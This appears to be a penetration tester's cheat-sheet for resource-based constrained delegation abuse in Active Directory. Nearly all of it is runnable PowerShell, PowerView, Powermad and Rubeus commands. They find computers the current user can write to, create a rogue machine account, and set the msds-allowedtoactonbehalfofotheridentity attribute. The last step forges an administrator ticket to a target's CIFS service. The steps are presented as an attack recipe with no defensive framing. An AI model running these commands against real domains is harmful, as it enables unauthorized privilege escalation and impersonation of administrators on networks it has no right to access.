* Need GenericWrite from user to computer

``` powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

* Check Quota
``` powershell
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

* Powermad 
``` powershell
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
```

``` powershell
Get-DomainComputer -Identity myComputer
```

* craft msds-allowedtoactonbehalfofotheridentity
``` powershell
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity [computername] | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

* Possible with GenericAll, WriteProperty, or WriteDACL


* verify
``` powershell
$RBCDbytes = Get-DomainComputer [computername] -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
ConvertFrom-SID [SID]   (This should be [domain]\myComputer$)
```

* attack
``` a
Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/[target fullname] /ptt
```
